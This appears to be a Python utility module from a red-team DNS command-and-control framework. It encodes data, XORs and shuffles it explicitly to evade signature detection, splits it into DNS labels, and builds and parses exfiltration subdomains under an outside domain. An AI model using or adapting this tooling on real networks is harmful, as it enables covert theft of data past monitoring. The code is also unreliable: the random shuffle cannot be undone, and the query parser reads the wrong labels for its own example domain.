# c2_frameworks/dns/utils.py
"""
DNS C2 Core Utilities
- Base32 encoding (DNS-safe, lowercase, no padding)
- Subdomain chunking (max 63 chars per label, 253 total)
- Session ID embedding
- Simple XOR + shuffle for anti-signature
"""

import secrets
import string
import binascii
from typing import List

# DNS-safe alphabet (RFC 4648 base32 but lowercase & no padding)
BASE32_ALPHABET = "abcdefghijklmnopqrstuvwxyz234567"

def dns_safe_base32_encode(data: bytes) -> str:
    """Encode to lowercase base32 without padding"""
    return binascii.b32encode(data).decode().lower().rstrip("=")

def dns_safe_base32_decode(s: str) -> bytes:
    """Decode DNS-safe base32 (add padding if needed)"""
    s = s.upper()
    missing_padding = len(s) % 8
    if missing_padding:
        s += "=" * (8 - missing_padding)
    return binascii.b32decode(s)

def generate_session_id() -> str:
    """8-char session ID – fits perfectly in a subdomain"""
    return "".join(secrets.choice(BASE32_ALPHABET) for _ in range(8))

def xor_shuffle(data: bytes, key: bytes = b"30DaysRedTeam") -> bytes:
    """XOR + Fisher-Yates shuffle – defeats static signatures"""
    xored = bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    lst = list(xored)
    for i in range(len(lst)-1, 0, -1):
        j = secrets.randbelow(i + 1)
        lst[i], lst[j] = lst[j], lst[i]
    return bytes(lst)

def chunk_subdomains(data: str, max_label: int = 63) -> List[str]:
    """
    Split encoded payload into valid DNS labels
    Returns list like ['abc123', 'def456', 'ghi789']
    """
    chunks = []
    for i in range(0, len(data), max_label):
        chunks.append(data[i:i + max_label])
    return chunks

def build_exfil_subdomain(
    session_id: str,
    chunk_id: int,
    total_chunks: int,
    payload_chunk: str,
    domain: str
) -> str:
    """
    Final subdomain format:
    <session>.<chunk_id>.<total>.<payload_chunk>.<domain>
    Example:
    abcd1234.001.005.x7p9m2k1v8n3q4r5.redteam30days.com
    """
    return f"{session_id}.{chunk_id:03d}.{total_chunks:03d}.{payload_chunk}.{domain}"

def parse_exfil_query(name: str) -> dict:
    """
    Parse incoming exfil query and return structured data
    """
    try:
        parts = name.lower().split(".")
        if len(parts) < 5:
            return None
        session_id = parts[-5]
        chunk_id = int(parts[-4])
        total_chunks = int(parts[-3])
        payload_chunk = parts[-2]
        return {
            "session_id": session_id,
            "chunk_id": chunk_id,
            "total_chunks": total_chunks,
            "payload_chunk": payload_chunk
        }
    except:
        return None